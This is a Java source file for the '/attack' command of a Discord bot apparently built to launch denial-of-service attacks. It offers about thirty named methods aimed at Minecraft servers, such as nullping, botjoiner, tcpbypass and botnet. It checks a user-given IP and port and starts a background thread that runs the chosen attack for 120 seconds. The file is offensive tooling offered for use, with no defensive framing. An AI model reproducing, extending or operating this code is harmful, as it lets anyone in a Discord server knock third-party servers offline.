package neko.itskekoff.discordddosbot.commands.impl;

import discord4j.core.event.domain.interaction.ChatInputInteractionEvent;
import discord4j.core.object.command.ApplicationCommandInteractionOption;
import discord4j.core.object.command.ApplicationCommandInteractionOptionValue;
import discord4j.core.spec.EmbedCreateSpec;
import discord4j.rest.util.Color;
import neko.itskekoff.discordddosbot.commands.SlashCommand;
import neko.itskekoff.discordddosbot.manager.impl.run;
import reactor.core.publisher.Mono;

import java.io.IOException;
import java.net.URISyntaxException;
import java.time.Instant;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;

public class DdosCommand implements SlashCommand {

    public String[] methods = {"join", "default", "legitjoin", "localhost", "invalidnames", "longnames", "botjoiner", "spoof", "ping", "nullping", "multikiller", "handshake", "bighandshake", "query", "bigpacket", "network", "randombytes", "extremejoin", "spamjoin", "nettydowner", "ram", "yoonikscry", "colorcrasher", "tcphit", "tcpbypass", "botnet", "queue", "ultimatesmasher", "sf", "nabcry"};

    @Override
    public String getname() {
        return "attack";
    }

    @Override
    public Mono<Void> handle(ChatInputInteractionEvent e) {
        Pattern regex = Pattern.compile("\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\\d{1,5}\\b");
        List methodsList = Arrays.asList(methods);
        String server = e.getOption("serverip")
                .flatMap(ApplicationCommandInteractionOption::getValue)
                .map(ApplicationCommandInteractionOptionValue::asString)
                .get();
        String method = e.getOption("method")
                .flatMap(ApplicationCommandInteractionOption::getValue)
                .map(ApplicationCommandInteractionOptionValue::asString)
                .get();

        if (!methodsList.contains(method)) {
            return e.reply()
                    .withContent("Метода не существует. /methods")
                    .withEphemeral(true);
        }
        if (!server.matches(regex.pattern())) {
            return e.reply()
                    .withContent("Неверный ip! Пример: 127.0.0.1:25565")
                    .withEphemeral(true);
        }
        if (methodsList.contains(method)) {
            if (method.equals("default")) {
                EmbedCreateSpec emb = EmbedCreateSpec.builder()
                        .color(Color.BROWN)
                        .title("Started!")
                        .description(server)
                        .addField("Метод", "Нуллпинг", true)
                        .timestamp(Instant.now())
                        .footer("View /credits to get additional info!", "https://i.ytimg.com/vi/HJ9Hq5wu-xw/maxresdefault.jpg")
                        .build();
                return e.reply()
                        .withEmbeds(emb);
            }
        }
        EmbedCreateSpec emb = EmbedCreateSpec.builder()
                .color(Color.BROWN)
                .title("Started!")
                .description(server)
                .addField("Метод", method, true)
                .timestamp(Instant.now())
                .footer("View /credits to get additional info!", "https://i.ytimg.com/vi/HJ9Hq5wu-xw/maxresdefault.jpg")
                .build();
        (new Thread(() -> {
            try {
                new run().launch(server, 120, method);
            } catch (IOException | InterruptedException | URISyntaxException ex) {
                ex.printStackTrace();
            }
        })).start();
        return e.reply()
                .withEmbeds(emb);
    }
}
